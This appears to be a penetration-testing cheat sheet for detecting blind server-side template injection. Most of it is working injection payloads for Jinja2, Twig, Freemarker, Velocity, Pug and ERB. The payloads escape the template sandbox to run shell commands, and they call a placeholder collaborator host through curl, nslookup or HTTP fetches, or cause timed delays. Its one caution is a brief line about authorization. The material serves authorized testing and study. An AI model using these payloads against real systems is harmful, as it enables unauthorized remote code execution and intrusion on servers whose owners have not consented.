# Blind SSTI — Out-of-Band Detection

## Summary
When SSTI evaluation doesn't produce visible output, use OOB (out-of-band) channels to confirm.

## When to Use Blind SSTI
- Input is processed but response doesn't reflect it
- Template output goes to email, log, background job
- Error messages are suppressed
- Response is always static regardless of input

## OOB via HTTP Request

```jinja2
# Jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[X]('curl http://COLLABORATOR/probe',shell=True) }}

# Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("curl http://COLLABORATOR/probe")}}

# Freemarker (Nashorn)
${"".class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('curl http://COLLABORATOR/probe')")}

# Velocity
#set($exec = $runtime.getRuntime().exec("curl http://COLLABORATOR/probe"))

# Pug
#{require('child_process').exec('curl http://COLLABORATOR/probe')}

# ERB
<%= `curl http://COLLABORATOR/probe` %>
```

## OOB via DNS

```jinja2
# Jinja2 — DNS lookup
{{ config.__class__.__init__.__globals__['os'].popen('nslookup COLLABORATOR').read() }}

# ERB
<%= `nslookup COLLABORATOR` %>
```

## Time-Based (if OOB is blocked)

```jinja2
# Jinja2 — time delay
{{ config.__class__.__init__.__globals__['os'].popen('sleep 5').read() }}

# ERB
<%= sleep 5 %>
```

## Template-Specific Probes (no RCE needed)

```jinja2
# Jinja2 — just probe evaluation
{{ cycler.next }}
{{ joiner("") }}

# Twig
{% set x = 1 %}

# Freemarker
<#assign x=1>
```

## Detection Without RCE

```jinja2
# Some templates support HTTP fetches natively:
# Jinja2 with requests
{{ config.__class__.__init__.__globals__['requests'].get('http://COLLABORATOR/probe') }}

# Twig
{{ dump("http://COLLABORATOR/probe") }}
```

## Notes
- OOB is the loudest signal — the target WILL see the outbound connection
- Only use OOB with authorization
- Use a public collaborator (webhook.site, interact.sh, Burp Collaborator)
- HTTP OOB is more reliable than DNS
